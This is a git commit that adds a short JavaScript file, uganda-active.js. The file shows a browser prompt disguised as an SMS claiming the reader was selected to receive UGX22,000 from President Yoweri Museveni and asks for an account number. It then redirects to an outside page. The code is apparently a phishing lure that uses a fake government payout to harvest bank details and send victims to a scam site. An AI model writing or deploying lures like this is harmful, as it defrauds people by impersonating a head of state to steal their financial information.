2e8a84d0db8130fb0ddbc8630dd20585b59f1bee
sweet16palz-hub <sweet16palz@gmail.com>
2026-01-17 16:03:07 +0100

    Create uganda-active.js

---
+++ uganda-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW UGX22,000'
+password=prompt('SMS: Congratulation. You are among the selected ones to Receive UGX22,000 From President Yoweri Museveni, kindly press Ok to submit Account Number ','WITHDRAW UGX22,000');
+if (password != 'WITHDRAW UGX22,000') {
+location.href='https://gbamz.com/ugx22000.html';
+}
